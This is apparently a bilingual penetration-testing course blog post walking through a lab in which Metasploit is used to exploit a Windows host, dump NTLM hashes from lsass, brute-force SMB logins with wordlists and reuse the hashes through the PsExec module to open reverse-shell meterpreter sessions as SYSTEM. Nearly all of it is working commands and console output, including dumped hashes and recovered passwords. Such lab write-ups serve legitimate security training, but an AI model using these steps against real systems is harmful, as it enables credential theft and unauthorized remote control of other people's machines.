---
layout: post
title: "Pass-The-Hash With PSExec"
date: "2023-02-22"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# Pass-The-Hash With PSExec
## Pass-The-Hash
Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately.

We can use the PsExec module to legitimately authenticate with the target system via SMB.

This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation.

# 使用 PsExec 传递哈希
## 哈希传递
传递哈希是一种利用技术，涉及捕获或收集 NTLM 哈希或明文密码，并利用它们对目标进行合法身份验证。

我们可以使用 PsExec 模块通过 SMB 对目标系统进行合法身份验证。

这种技术将使我们能够通过合法凭证获得对目标系统的访问权限，而不是通过服务利用获得访问权限。

# Demo: Pass-The-Hash With PsExec（演示：使用 PsExec 传递哈希）
The reason this technique in so important is primarily because once you've obtained the credentials or hashes from a target system, you can utilize those credentials to authenticate with the target or to establish a meterpreter session on the target through the use of these credentials. So you can utilize them to authenticate legitimately with the target system, consequently negating or eliminating the need to go through the exploitation process again in order to gain access.

Once you get the NTLM hashes on a system, you pretty much do not need to exploit the system or exploit a vulnerable service on the target to gain access. You can utilize the credentials that you've been able to dump, and you don't need to go through the exploitation process again.

We'll take a look at how to utilize the dumped hashes to authenticate legitimately with the target system by leveraging the PsExec module.

Target IP Address: 10.2.29.165

```
service postgresql start && msfconsole
workspace -a PsExec
setg RHOSTS 10.2.29.165
search badblue
use exploit/windows/http/badblue_passthru
show options
set target BadBlue\ EE\ 2.7\ Universal
exploit
```

Get our current privileges.

```
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
```

We have Administrator access. 

List out the `sysinfo`, or System Information.

```
meterpreter > sysinfo
Architecture : x64
Meterpreter : x86/windows
```

We have a 32-bit meterpreter payload.

Locate the LSASS process or lsass.exe.

```
meterpreter > pgrep lsass
788
```

Migrate into that particular process.

```
meterpreter > migrate 788
```

Get our privileges or list out the current access that we have.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

We have `NT AUTHORITY\SYSTEM` privileges.

Use the `hashdump` command or utilize the Mimikatz or Kiwi module.

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
student:1008:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:f27c0c12a5c94e851d73b4ce3a77d149:::
```

We can obtain a meterpreter session on the target through the use of these hashes alone. So we do not need to exploit any service.

Exit from our meterpreter session.

```
meterpreter > exit
meterpreter > sessions
```

We don't have any more meterpreter sessions.

We'll change the payload to x64. And the reason we are doing that is primarily because the target system is a 64-bit operating system. 

```
search psexec
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
show options
```

It's going to ask us for the SMBUser (SMBUser) and the SMB password (SMBPass). So we can specify the hashes here. And we can also specify the SMB domain (SMBDomain) if the system is connected to a domain.

If we want to get a meterpreter session as the Administrator user, we would copy the hash. And the hash ends right over here. So you want to make sure you don't copy the colons.

Set the SMBUser value to Administrator, or the user that you want to authenticate as.

```
set SMBUser Administrator
```

And we're then going to set the SMB password to the hash here. And if you also obtain clear text credentials, then you can also just paste the clear text credentials in here.

```
set SMBPass aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
```

```
exploit
meterpreter > sysinfo
Architecture : x64
Meterpreter : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Put this in the background.

List out our sessions.

```
sessions
```

You can see this is `NT AUTHORITY\SYSTEM`, because we authenticated with the Administrator user, so we get the `NT AUTHORITY\SYSTEM` privileges.

We can also authenticate as the student account. And then set the SMB password to the student password hash.

```
set SMBUser student
set SMBPass aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
exploit
```

We need to specify the LPORT option, because port 4444 is currently being used.

```
set LPORT 4433
exploit
```

In this case, it looks like we cannot authenticate as the student.

As long as we have access with or through the Administrator crdentials. Then we pretty much have Administrative access on the target.

And we can do this as many times as we want.

```
sessions 2
exit
```

```
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889
exploit
```

Only the Administrator account works. And we can't log in as the student account.

That's one of the great things about gathering hashes or credentials is that you can use them to authenticate legitimately or to perform authenticated code execution, and in this case, obtain a meterpreter session.

That is how to perform the pass-the-hash attack with PsExec module.

# Windows: SMB Server PSexec（Windows：SMB 服务器 PSexec）
## Overview（概述）
A Kali GUI machine and a target machine running a vulnerable SMB service are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the SMB service using the tools available on the Kali machine and then exploit the vulnerability using the Metasploit framework. You need to find valid credentials to access the SMB service and abuse the service with available SMB Metasploit exploitation modules.

Objective: Exploit the SMB service to get a meterpreter on the target and retrieve the flag!

Instructions:

* Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y.
* The IP address of the target machine is mentioned in the file “/root/Desktop/target”
* Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1

Dictionaries to use:
* /usr/share/metasploit-framework/data/wordlists/common_users.txt
* /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

为您提供了一台 Kali GUI 机器和一台运行易受攻击的 SMB 服务的目标机器。目标机器的 IP 地址在位于 Kali 机器桌面 (/root/Desktop/target) 上的名为 target 的文本文件中提供。 

您的任务是使用 Kali 机器上可用的工具对 SMB 服务进行指纹识别，然后使用 Metasploit 框架利用该漏洞。您需要找到有效的凭据才能访问 SMB 服务并使用可用的 SMB Metasploit 利用模块滥用该服务。

目标： 利用 SMB 服务在目标上获取 meterpreter 并检索标志！

指示：

* 你的 Kali 机器有一个 IP 地址为 10.10.XY 的接口运行“ip addr”来知道 X 和 Y 的值。
* 目标机器的 IP 地址在文件“/root/Desktop/target”中提到
* 不要攻击位于 IP 地址 192.VW1 和 10.10.X.1 的网关

使用的词典：
* /usr/share/metasploit-framework/data/wordlists/common_users.txt
* /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

## Solutions（解决方案）
The solution for this lab can be found in the following manual: https://assets.ine.com/labs/ad-manuals/walkthrough-1959.pdf

## 我自己的思路
Target IP Address : 10.0.23.243

[SMB LOGIN CHECK](https://www.offensive-security.com/metasploit-unleashed/smb-login-check/)

```
root@attackdefense:~# service postgresql start && msfconsole -q
Starting PostgreSQL 12 database server: main.
msf5 > workspace -a PsExec
[*] Added workspace: PsExec
[*] Workspace: PsExec
msf5 > setg RHOSTS 10.0.23.243
RHOSTS => 10.0.23.243
msf5 > db_nmap -sV 10.0.23.243
[*] Nmap: Starting Nmap 7.70 ( https://nmap.org ) at 2023-02-22 19:02 IST
[*] Nmap: Nmap scan report for 10.0.23.243
[*] Nmap: Host is up (0.0023s latency).
[*] Nmap: Not shown: 996 closed ports
[*] Nmap: PORT     STATE SERVICE       VERSION
[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp  open  microsoft-ds?
[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 16.76 seconds
msf5 > services
Services
========

host         port  proto  name           state  info
----         ----  -----  ----           -----  ----
10.0.23.243  135   tcp    msrpc          open   Microsoft Windows RPC
10.0.23.243  139   tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
10.0.23.243  445   tcp    microsoft-ds   open   
10.0.23.243  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services

```

```
msf5 > use auxiliary/scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5 auxiliary(scanner/smb/smb_login) > set VERBOSE false
VERBOSE => false
msf5 auxiliary(scanner/smb/smb_login) > run

[+] 10.0.23.243:445       - 10.0.23.243:445 - Success: '.\sysadmin:samantha'
[+] 10.0.23.243:445       - 10.0.23.243:445 - Success: '.\demo:victoria'
[+] 10.0.23.243:445       - 10.0.23.243:445 - Success: '.\auditor:elizabeth'
[+] 10.0.23.243:445       - 10.0.23.243:445 - Success: '.\administrator:qwertyuiop' Administrator
[*] 10.0.23.243:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

[PSEXEC PASS THE HASH](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)

```
msf5 auxiliary(scanner/smb/smb_login) > search psexec

Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------
   10  exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
```

```
msf5 auxiliary(scanner/smb/smb_login) > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                10.0.23.243      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/smb/psexec) > set SMBUser administrator
SMBUser => administrator
msf5 exploit(windows/smb/psexec) > set SMBPass qwertyuiop
SMBPass => qwertyuiop
msf5 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.16.3:4444 
[*] 10.0.23.243:445 - Connecting to the server...
[*] 10.0.23.243:445 - Authenticating to 10.0.23.243:445 as user 'administrator'...
[*] 10.0.23.243:445 - Selecting PowerShell target
[*] 10.0.23.243:445 - Executing the payload...
[+] 10.0.23.243:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176195 bytes) to 10.0.23.243
[*] Meterpreter session 1 opened (10.10.16.3:4444 -> 10.0.23.243:49809) at 2023-02-22 19:28:08 +0530

meterpreter > 

```

```
meterpreter > sysinfo
Computer        : EC2AMAZ-408S766
OS              : Windows 2016+ (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > pgrep lsass
696
meterpreter > migrate 696
[*] Migrating from 2680 to 696...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : EC2AMAZ-408S766
OS              : Windows 2016+ (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows

```

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0d757ad173d2fc249ce19364fd64c8ec:::
auditor:1012:aad3b435b51404eeaad3b435b51404ee:b8f8e199032b942917462188805a5d5d:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
demo:1013:aad3b435b51404eeaad3b435b51404ee:4699b6979c6e1513ec8f54ba8dd219b2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sysadmin:1011:aad3b435b51404eeaad3b435b51404ee:e8a38f149bf33b7e1678cb0676dd9df5:::

```

```
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 10.0.23.243 - Meterpreter session 1 closed.  Reason: User exit
msf5 exploit(windows/smb/psexec) > sessions

Active sessions
===============

No active sessions.

```

```
msf5 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(windows/smb/psexec) > set SMBUser Administrator
SMBUser => Administrator
msf5 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:0d757ad173d2fc249ce19364fd64c8ec
SMBPass => aad3b435b51404eeaad3b435b51404ee:0d757ad173d2fc249ce19364fd64c8ec
msf5 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.16.3:4444 
[*] 10.0.23.243:445 - Connecting to the server...
[*] 10.0.23.243:445 - Authenticating to 10.0.23.243:445 as user 'Administrator'...
[*] 10.0.23.243:445 - Selecting PowerShell target
[*] 10.0.23.243:445 - Executing the payload...
[*] Sending stage (201283 bytes) to 10.0.23.243
[+] 10.0.23.243:445 - Service start timed out, OK if running a command or non-service executable...
[*] Meterpreter session 2 opened (10.10.16.3:4444 -> 10.0.23.243:49841) at 2023-02-22 19:38:20 +0530

meterpreter > sysinfo
Computer        : EC2AMAZ-408S766
OS              : Windows 2016+ (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > background
[*] Backgrounding session 2...

```

```
msf5 exploit(windows/smb/psexec) > sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ EC2AMAZ-408S766  10.10.16.3:4444 -> 10.0.23.243:49841 (10.0.23.243)

```

```
msf5 exploit(windows/smb/psexec) > set SMBUser demo
SMBUser => demo
msf5 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:4699b6979c6e1513ec8f54ba8dd219b2
SMBPass => aad3b435b51404eeaad3b435b51404ee:4699b6979c6e1513ec8f54ba8dd219b2
msf5 exploit(windows/smb/psexec) > set LPORT 4433
LPORT => 4433
msf5 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.16.3:4433 
[*] 10.0.23.243:445 - Connecting to the server...
[*] 10.0.23.243:445 - Authenticating to 10.0.23.243:445 as user 'demo'...
[-] 10.0.23.243:445 - Exploit failed [no-access]: RubySMB::Error::UnexpectedStatusCode STATUS_ACCESS_DENIED
[*] Exploit completed, but no session was created.

```